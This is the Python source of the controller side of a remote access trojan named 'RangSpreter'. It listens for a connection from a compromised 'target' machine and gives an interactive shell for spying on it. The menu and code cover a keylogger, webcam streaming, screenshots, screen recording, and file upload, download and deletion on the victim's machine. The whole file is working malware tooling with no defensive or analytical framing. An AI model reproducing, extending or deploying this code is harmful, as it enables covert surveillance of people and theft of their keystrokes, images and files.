import socket
import json
import os
from colorama import init, Fore, Style
import struct
import pickle
import cv2
import threading

init(autoreset=True)
soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.bind(('192.168.1.24', 5555))
print(Fore.GREEN + 'wait for connection ...')
soc.listen(1)

connection = soc.accept()
_target = connection[0]
ip = connection[0]
print(Fore.RED + """
    	░█▀▄░█▀█░█▀█░█▀▀░█▀▀░█▀█░█▀▄░█▀▀░▀█▀░█▀▀░█▀▄
	░█▀▄░█▀█░█░█░█░█░▀▀█░█▀▀░█▀▄░█▀▀░░█░░█▀▀░█▀▄
	░▀░▀░▀░▀░▀░▀░▀▀▀░▀▀▀░▀░░░▀░▀░▀▀▀░░▀░░▀▀▀░▀░▀
    """ + Fore.CYAN + '\nNice! connected to:')
print(Fore.CYAN + f"{_target}")
print(Fore.CYAN + "Use h command to see options!")

def data_accepted():
	data = ''
	while True:
		try:
			data = data + _target.recv(1024).decode().rstrip()
			return json.loads(data)
		except ValueError:
			continue

def dlf(fname):
	file = open(fname, 'wb')
	_target.settimeout(1)
	_file = _target.recv(1024)
	while _file:
		file.write(_file)
		try:
			_file = _target.recv(1024)
		except socket.timeout as e:
			break 
	_target.settimeout(None)
	file.close()

def ulf(fname):
	file = open(fname, 'rb')
	_target.send(file.read())
	file.close()

def convert_byte_stream():
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.bind(('192.168.1.12', 9999))
	sock.listen(5)
	connection = sock.accept()
	tg = connection[0]
	ip = connection[1]

	bdata = b""
	pl_size = struct.calcsize("Q")

	while True:
		while (len(bdata)) < pl_size:
			packet = tg.recv(4*1024)
			if not packet: break
			bdata += packet

		packed_msg_size = bdata[:pl_size]
		bdata = bdata[pl_size:]
		msg_size = struct.unpack("Q", packed_msg_size)[0]
		while len(bdata) < msg_size:
			bdata += tg.recv(4*1024)
		frame_data = bdata[:msg_size]
		bdata = bdata[msg_size:]
		frame = pickle.loads(frame_data)
		cv2.imshow("Start Recording . . .", frame)
		key = cv2.waitKey(1)
		if key == 27:
			break
	tg.close()
	cv2.destroyAllWindows()

def stream_cam():
	t = threading.Thread(target=convert_byte_stream)
	t.start()

def convert_byte_record():
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.bind(('192.168.1.24', 9995))
	sock.listen(5)
	connection = sock.accept()
	tg = connection[0]
	ip = connection[1]

	bdata = b""
	pl_size = struct.calcsize("i")

	while True:
		while (len(bdata)) < pl_size:
			packet = tg.recv(1024)
			if not packet: break
			bdata += packet

		packed_msg_size = bdata[:pl_size]
		bdata = bdata[pl_size:]
		msg_size = struct.unpack("i", packed_msg_size)[0]
		while len(bdata) < msg_size:
			bdata += tg.recv(1024)
		frame_data = bdata[:msg_size]
		bdata = bdata[msg_size:]
		frame = pickle.loads(frame_data)
		cv2.imshow("Start Screen Recording . . .", frame)
		key = cv2.waitKey(1)
		if key == 27:
			break
	tg.close()
	cv2.destroyAllWindows()

def record():
	t = threading.Thread(target=convert_byte_record)
	t.start() #bro, i forgot to add () and that's make me search it for almost 40 minutes!

def help():
	print("""
RangSpreter Options:
wipe 		      clear rangspreter output (instead clear command)
ul                    upload file to target
dl                    download file from target
exit, out             get out from target
sl                    start keylogger (when you are start keylogger, you cant use any of those commands)
rl                    read keylogger (dont use this command if you dont start keylogger/sl)
stl                   stop keylogger (dont use this command if you dont start keylogger/sl)
wcam                  start web camera (use escape button to stop webcam)
sh                    screenshot target monitor
sr		      (NEW FEATURE) screen recording
h		      (NEW FEATURE) show options

Default options:
mkdir                 make directory/folder
rmdir                 remove directory/folder
del                   delete file
ipconfig              see target IP details
whoami                who you are in the target
move 		      move file to other directory
		""")

def communicate_shell():
	n = 0
	while True:
		command = input(Fore.GREEN + 'rangspreter>> ')
		data = json.dumps(command)
		_target.send(data.encode())
		if command in ('exit', 'out'):
			break
		elif command == 'wipe':
			os.system('clear')
		elif command[:3] == 'cd ':
			pass
		elif command[:2] == 'dl':
			dlf(command[3:])
		elif command[:2] == 'ul':
			ulf(command[3:])
		elif command == 'sl':
			pass
		elif command == 'rl':
			data = _target.recv(1024).decode()
			print(data)
		elif command == 'stl':
			pass
		elif command == 'wcam':
			stream_cam()
		elif command == 'sh':
			n += 1
			file = open("ss"+str(n)+".png", 'wb')
			_target.settimeout(3)
			_file = _target.recv(1024)
			while _file:
				file.write(_file)
				try:
					_file = _target.recv(1024)
				except socket.timeout as e:
					break 
			_target.settimeout(None)
			file.close()
		elif command == 'sr': #new screen recording feature
			record()
		elif command == "h":
			help()
		else:
			done = data_accepted()
			print(done)

communicate_shell()
